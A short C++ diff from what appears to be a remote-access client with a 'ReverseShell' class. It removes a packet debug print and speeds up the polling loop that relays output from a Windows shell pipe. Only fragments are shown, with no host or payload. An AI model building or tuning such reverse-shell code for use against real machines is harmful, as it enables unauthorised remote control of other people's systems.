@@ -715,8 +715,6 @@ void Cliente::MainLoop() {
             struct Paquete nNuevo;
             this->m_DeserializarPaquete(cBuffer.data(), nNuevo);
 
-            Print_Packet(nNuevo);
-
             this->Procesar_Paquete(nNuevo);
 
         }
@@ -1091,7 +1089,7 @@ void ReverseShell::thLeerShell(HANDLE hPipe) {
             if (dBytesReaded > 0) {
                 ReadFile(hPipe, cBuffer, sizeof(cBuffer), &dBytesReaded, nullptr);
             }else {
-                std::this_thread::sleep_for(std::chrono::milliseconds(100));
+                std::this_thread::sleep_for(std::chrono::milliseconds(10));
                 continue;
             }
             for (dBufferC = 0, dBytesToWrite = 0; dBufferC < dBytesReaded; dBufferC++) {
